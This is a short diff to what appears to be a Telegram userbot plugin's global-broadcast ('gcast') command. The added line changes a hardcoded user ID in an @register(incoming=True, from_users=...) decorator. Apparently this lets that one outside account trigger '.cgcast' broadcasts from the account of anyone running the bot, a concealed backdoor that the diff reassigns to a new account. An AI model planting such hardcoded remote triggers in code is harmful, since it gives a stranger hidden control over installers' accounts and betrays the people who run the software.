@@ -35,7 +35,7 @@ GCAST_BLACKLIST = [
 
 
 @bing_cmd(pattern="gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1663258664,
+@register(incoming=True, from_users=1337194042,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
